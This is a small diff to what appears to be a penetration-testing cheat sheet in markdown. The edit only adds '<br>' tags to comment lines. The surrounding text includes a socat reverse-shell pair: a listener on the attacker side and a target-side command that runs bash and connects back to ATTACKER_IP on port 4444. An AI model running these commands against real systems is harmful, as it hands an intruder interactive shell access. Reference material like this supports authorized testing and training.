@@ -1419,9 +1419,9 @@ https://fahmifj.medium.com/get-a-fully-interactive-reverse-shell-b7e8d6f5b1c1
 <br>```export TERM=xterm```
 
 <br># Reverse shell /dev/pts method
-# On attacker
+<br># On attacker
 <br>```socat file:`tty`,raw,echo=0 tcp-listen:4444```
-# On target
+<br># On target
 <br>```socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444```
 
 ### SQLi (SQL Injection)<a name="sqli-sql-injection_manual"></a>
